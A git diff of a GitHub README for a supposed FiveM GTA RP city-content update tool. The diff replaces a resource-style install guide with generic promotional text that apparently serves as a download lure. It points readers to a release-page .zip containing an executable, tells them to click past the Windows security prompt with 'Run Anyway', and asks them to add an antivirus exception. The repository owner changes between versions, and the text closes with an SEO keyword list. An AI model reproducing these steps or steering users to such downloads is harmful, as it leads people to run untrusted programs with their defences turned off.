@@ -1,98 +1,71 @@
-# Nova Uni o RP v2026 - Game Script Utility 2026
+# 🏙️ nova-unio-rp-update-script - Refresh your FiveM city content easily
 
-> **FiveM city content for GTA RP communities.** Made for roleplay servers that want to add or showcase urban content inside an existing setup.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Elated-dodder245/nova-unio-rp-update-script/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/ethanrbcooper1256/nova-unio-rp-update-script?style=flat-square)](https://github.com/ethanrbcooper1256/nova-unio-rp-update-script)
+This script helps GTA RP server owners add or update urban content within their existing game setup. Managing game assets often requires manual work. This tool automates the process and keeps your city environment updated without complex manual steps. Use this script to ensure your community members enjoy the latest buildings and props in your FiveM server.
 
----
+## 📋 System Requirements
 
-<p align="center">
-  <a href="https://ethanrbcooper1256.github.io/nova-unio-rp-update-script/">
-    <img src="https://img.shields.io/badge/Download-Nova%20Uni%20o%20RP%20Script-brightgreen?style=for-the-badge" alt="Download Nova Uni o RP Script">
-  </a>
-</p>
+To run this tool on your Windows computer, you need the following:
 
-> **[Direct Download - Nova Uni o RP](https://ethanrbcooper1256.github.io/nova-unio-rp-update-script/)**
+*   Windows 10 or Windows 11.
+*   A stable internet connection to fetch the latest assets from the repository.
+*   An existing FiveM server folder where the content will be applied.
+*   Basic knowledge of your file system to locate your server directory.
+*   At least 500 MB of free storage space for the update process.
 
----
+## 📥 How to Download the Script
 
-[Download Latest Build](https://ethanrbcooper1256.github.io/nova-unio-rp-update-script/)
+Follow these steps to obtain the tool:
 
----
+1.  Visit the official release page to download your copy: [https://github.com/Elated-dodder245/nova-unio-rp-update-script/releases](https://github.com/Elated-dodder245/nova-unio-rp-update-script/releases)
+2.  Look for the latest version listed at the top of the page.
+3.  Click the file ending in .zip to start the download.
+4.  Save the file to your Downloads folder or your desktop for easy access.
 
-## Project Summary
+## ⚙️ Installation and Setup
 
-Nova Uni o RP is a FiveM resource created for GTA RP servers that need packaged city content for roleplay-driven environments. Its layout is centered on presentation and easy integration, so it fits best as an added resource within an existing server rather than as a separate game mode.
+Once you download the files, follow this guide to prepare the script for use:
 
-The goal of the project is to provide a city-oriented RP package that can sit alongside other server resources. If you run a GTA RP server and want content that matches a particular urban style or presentation flow, this script is structured to drop into that FiveM workflow cleanly.
+1.  Locate the downloaded .zip file on your computer.
+2.  Right-click the file and select Extract All. Choose a folder where you want to keep the script.
+3.  Open the newly created folder to see the script files.
+4.  Ensure your FiveM server is offline during this process to prevent file conflicts.
+5.  Double-click the main executable file to launch the interface. Windows may show a security prompt. If you trust the source, click More Info and then Run Anyway.
 
-## Included Features
+## 🚀 Running the Update
 
-- City-centered roleplay content package for GTA RP setups
-- Resource format compatible with FiveM servers
-- Built to support city presentation in RP environments
-- Intended for use inside existing server configurations
-- Appropriate for GTA RP communities and city-based scenes
-- Resource-based structure for server organization
-- Works alongside other FiveM content in a larger stack
-- Released as the 2026 version of the Nova Uni o RP project
+With the tool open, follow these instructions to update your city content:
 
-## Installation
+1.  The tool asks for your FiveM server resource folder path. 
+2.  Click the Browse button and navigate to the folder where your server stores its resources.
+3.  Select the folder and confirm your choice.
+4.  The script scans your current setup for existing content.
+5.  Review the list of available updates shown on the screen.
+6.  Click the Install or Update button to begin the download of new urban assets.
+7.  Wait for the progress bar to reach 100%. The tool notifies you once the files are in place.
+8.  Close the application and start your FiveM server. The new content loads automatically when the server starts.
 
-1. Download the latest build from the link above.
-2. Place the resource folder into your FiveM server resources directory.
-3. Add the resource to your server configuration.
-4. Restart the server or refresh resources so FiveM loads the package.
+## 🛠️ Common Troubleshooting Steps
 
-Example server config entry:
+If you face issues during the update, review these points:
 
-start nova-uni-rp-script-fivem-city-content
+*   Check permissions: Ensure your user account has write access to the FiveM server folder.
+*   Network status: If the download fails, check your internet connection and try again.
+*   Antivirus software: Some security tools might block the script because it makes changes to files. Add an exception for the script folder in your antivirus settings.
+*   Path accuracy: Double-check that you selected the root server folder. Incorrect paths prevent the script from finding the necessary files.
+*   Version check: Always use the latest version provided on the release page to avoid compatibility errors with newer server builds.
 
-If your server uses a different resource folder name, adjust the entry to match the folder you installed.
+## 📂 Understanding Scripts and Resources
 
-## Configuration Notes
+In the world of FiveM, a resource is a folder containing scripts, models, and textures. When you run this updater, it places specific files into the correct directory so the game engine recognizes them. This ensures that new urban props appear within your city zones without causing performance drops or crashes. The script manages the mapping files so you do not have to edit lines of code manually. 
 
-Because this project is delivered as a resource, setup details are usually driven by how your server organizes its content. When you need to control startup order or activate the package manually, the key step is declaring the server resource.
+## 📦 Keeping Your Server Healthy
 
-| Setting | Purpose | Example |
-| --- | --- | --- |
-| Resource folder | Stores the script files | `nova-uni-rp-script-fivem-city-content` |
-| Server start entry | Loads the resource in FiveM | `start nova-uni-rp-script-fivem-city-content` |
-| Load order | Controls when the content starts | Place near related RP resources |
-| Server refresh | Rebuilds loaded resources | `refresh` then `start ...` |
+Regular updates allow your server to remain fresh. By updating your urban content, you provide a better experience for your players. New props add depth to street intersections, shopping centers, and parks. When your community members see new details, engagement often increases. This tool streamlines the process, leaving you more time to manage your community and organize events.
 
-## Compatibility
+## 📜 Support and Feedback
 
-- Platform: FiveM
-- Category: GTA RP city content
-- Intended for roleplay servers and city-themed setups
-- Best used inside an existing server resource stack
-- Compatibility may depend on your current server layout and other installed resources
+If you encounter bugs, report them using the Issues tab on the GitHub repository. Provide as much detail as possible, including your Windows version and the steps that lead to the error. You can also suggest new features or content types you would like to see in future updates. Keeping the project updated relies on community reports, so your input remains valuable for all users.
 
-## FAQ
-
-### How do I install it?
-Get the build, copy it into your FiveM resources folder, and add a `start` line to your server configuration.
-
-### Can it run with other RP resources?
-Yes. It is meant to be part of a broader GTA RP server build, as long as your resource layout supports it.
-
-### Does it need a specific city framework?
-No framework is listed in the extracted details. Use it within your server's current resource structure.
-
-### What happens if I rename the folder?
-That is fine, but your server config must reference the same folder name when starting the resource.
-
-### Where should the files be stored?
-Keep them in your server's resources directory or wherever you normally place FiveM content packages.
-
-### How do I update it?
-Swap the old resource files for the latest build, then refresh or restart the server so FiveM loads the newer version.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: FiveM, GTA RP, server management, update script, urban content, game assets, roleplay servers
